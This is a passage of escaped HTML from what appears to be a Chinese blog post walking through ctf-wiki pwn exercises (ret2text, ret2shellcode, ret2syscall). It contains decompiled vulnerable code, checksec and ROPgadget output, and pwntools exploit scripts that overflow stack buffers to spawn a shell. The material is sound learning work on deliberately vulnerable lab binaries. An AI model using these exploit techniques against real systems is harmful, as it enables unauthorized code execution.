&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;A&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">112&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">struct&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;I&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x804863a&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823115054852.png"
width="768"
height="189"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823115054852_hu547b216eb7564cf5d0c43082362f8833_81863_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823115054852_hu547b216eb7564cf5d0c43082362f8833_81863_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220823115054852"
class="gallery-image"
data-flex-grow="406"
data-flex-basis="975px"
>&lt;/p>
&lt;h2 id="ret2shellcode">ret2shellcode&lt;/h2>
&lt;blockquote>
&lt;p>来源依然是 ctf-wiki 我就不放链接了。&lt;/p>
&lt;/blockquote>
&lt;h3 id="基本信息-1">基本信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl"># file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin/ret2shellcode: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=47e6d638fe0f3a3ff4695edb8b6c7e83461df949, with debug_info, not stripped
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># checksec
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CANARY : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FORTIFY : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NX : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PIE : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">RELRO : Partial
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="行为分析-1">行为分析&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-4 » bin/ret2shellcode
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">No system for you this time !!!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">noooooooooooo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bye bye ~%
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="反编译分析-1">反编译分析&lt;/h3>
&lt;p>这次换个工具。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823172802222.png"
width="1235"
height="803"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823172802222_hu949b7766ae1479d0a57fa90f15ea25cc_123358_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823172802222_hu949b7766ae1479d0a57fa90f15ea25cc_123358_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220823172802222"
class="gallery-image"
data-flex-grow="153"
data-flex-basis="369px"
>&lt;/p>
&lt;p>知名的 Ghidra，直接看 C 代码。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">local_74&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">112&lt;/span>&lt;span class="p">];&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setvbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stdout&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="mh">0x0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setvbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stdin&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="mh">0x0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;No system for you this time !!!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">gets&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">local_74&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">strncpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">local_74&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;bye bye ~&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>不装模作样分析，直接看&lt;code>strncpy&lt;/code>，函数签名是 &lt;code>strncpy(char* dest,const char* src, size_t count)&lt;/code>，写入的位置 &lt;code>buf2&lt;/code> 观察下有没有执行权限。&lt;code>buf2&lt;/code> 是可读写全局变量，这种全局变量放置在&lt;code>.bss&lt;/code>段，所以直接看&lt;code>.bss&lt;/code>段有没有可执行属性。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823181351695.png"
width="583"
height="61"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823181351695_hu15b94843b2e60a3c277f933546fba541_5458_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823181351695_hu15b94843b2e60a3c277f933546fba541_5458_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220823181351695"
class="gallery-image"
data-flex-grow="955"
data-flex-basis="2293px"
>&lt;/p>
&lt;p>emmm&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823181428657.png"
width="760"
height="153"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823181428657_hu0fb50fae7317e1ff7df4938f59edd46d_76970_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220823181428657_hu0fb50fae7317e1ff7df4938f59edd46d_76970_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220823181428657"
class="gallery-image"
data-flex-grow="496"
data-flex-basis="1192px"
>&lt;/p>
&lt;p>emmmmmmmmmm&amp;hellip;&amp;hellip;&amp;hellip;.&lt;/p>
&lt;p>好。那不用看 ctf-wiki 的题解了，按自己的思路来。&lt;code>checksec&lt;/code> 的结果是 &lt;code>NX: false&lt;/code>，栈上有可执行权限。而且没有 PIE，关了 ASLR 直接硬编码栈上地址就完事。&lt;/p>
&lt;p>老规矩算一下 buf &lt;code>0xffffd0ec&lt;/code> 到返回地址的 &lt;code>0xffffd15c&lt;/code> 距离，溢出后地址设置为&lt;code>buf&lt;/code>的地址。计算得距离 112 字节，接下来写 exploit 。&lt;/p>
&lt;h3 id="exploit-1">exploit&lt;/h3>
&lt;blockquote>
&lt;p>注意环境变量数量会影响 &lt;code>&amp;amp;buf&lt;/code> 的地址，为了保证得到的地址和 &lt;code>pwn.process&lt;/code> 启动一致，最好调试时也使用 &lt;code>pwn.gdb.debug&lt;/code> 启动，设置下 &lt;code>env={}&lt;/code>。或自己管理环境变量，确保不影响栈上变量的地址。&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">pwn&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">shellcraft&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pwn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./bin/ret2shellcode&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">env&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{})&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pwn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">asm&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">shellcraft&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">linux&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sh&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;A&amp;#39;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">112&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">struct&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;I&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xffffddcc&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824095344282.png"
width="640"
height="194"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824095344282_hubc47eafd56834041f67351860fb006fd_73328_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824095344282_hubc47eafd56834041f67351860fb006fd_73328_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220824095344282"
class="gallery-image"
data-flex-grow="329"
data-flex-basis="791px"
>&lt;/p>
&lt;h2 id="ret2syscall">ret2syscall&lt;/h2>
&lt;blockquote>
&lt;p>题目来自 ctf-wiki。&lt;/p>
&lt;/blockquote>
&lt;h3 id="基本信息-2">基本信息&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl"># file
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin/ret2syscall: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># checksec
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CANARY : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">FORTIFY : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NX : ENABLED
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PIE : disabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">RELRO : Partial
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="行为分析-2">行为分析&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-4 » bin/ret2syscall
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">This time, no system() and NO SHELLCODE!!!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">What do you plan to do?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">123
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="反编译分析-2">反编译分析&lt;/h3>
&lt;p>还是 Ghidra ，熟悉下工具。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824102626145.png"
width="467"
height="312"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824102626145_hu9c7c0837418d16fd6a6e1af973e1a558_15061_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824102626145_hu9c7c0837418d16fd6a6e1af973e1a558_15061_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220824102626145"
class="gallery-image"
data-flex-grow="149"
data-flex-basis="359px"
>&lt;/p>
&lt;p>只有一个输入，buf实际长度应该是100，和返回地址距离112。因为NX开启栈段是没有执行权限的。简单翻一下 PLT 发现也确实没有 &lt;code>system&lt;/code> 函数。&lt;/p>
&lt;p>x86 32位系统调用 int 80h 方式需要通过寄存器传参和传递系统调用号，单覆盖一个返回地址是屁用没有的。想要构造出系统调用必须的上下文（覆盖给定的寄存器），就需要找到一个或多个 &lt;code>pop; ret&lt;/code> 指令序列，填充好寄存器后再跳转到 &lt;code>int $0x80&lt;/code>指令处。&lt;/p>
&lt;p>需要控制的寄存器有：&lt;code>eax&lt;/code>、&lt;code>ebx&lt;/code>、&lt;code>ecx&lt;/code>、&lt;code>edx&lt;/code> 四个。&lt;/p>
&lt;p>用 ROPGadget 查找可用的 Gadgets 。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-4 » ROPgadget --binary bin/ret2syscall --only &amp;#39;pop|ret&amp;#39; | grep &amp;#39;eax&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x080bb196 : pop eax ; ret
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x0807217a : pop eax ; ret 0x80e
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x0804f704 : pop eax ; ret 3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>第一个和第六个都能控制多个寄存器，但都有多余的 &lt;code>pop&lt;/code> 指令，我们先选第二个 &lt;code>0x080bb196 : pop eax ; ret&lt;/code> 再搜索控制&lt;code>ebx&lt;/code>的指令序列。简单起见我就把其他结果略了，下面的结果正好控制了剩余三个寄存器 &lt;code>ebx&lt;/code>、&lt;code>ecx&lt;/code>、&lt;code>edx&lt;/code>。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>再寻找一个 &lt;code>int $0x80&lt;/code> 。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-4 » ROPgadget --binary bin/ret2syscall --only &amp;#39;int&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Gadgets information
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">============================================================
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x08049421 : int 0x80
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>然后顺便找一下有没有现成的 &lt;code>/bin/sh&lt;/code> 或者 &lt;code>sh&lt;/code> 字符串可以用。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-4 » ROPgadget --binary bin/ret2syscall --string &amp;#39;/bin/sh&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Strings information
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">============================================================
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x080be408 : /bin/sh
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>我们最终想要得到的栈是这样的：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824135729859.png"
width="389"
height="400"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824135729859_hu9e96c79361d03e349d816785438cafc1_14374_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%87%A0%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84-pwn-%E7%BB%83%E4%B9%A0/image-20220824135729859_hu9e96c79361d03e349d816785438cafc1_14374_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220824135729859"
class="gallery-image"
data-flex-grow="97"
data-flex-basis="233px"
>&lt;/p>
&lt;p>现在已经凑齐了所有要素，可以开始写 exploit 。&lt;/p>
&lt;h3 id="exploit-2">exploit&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
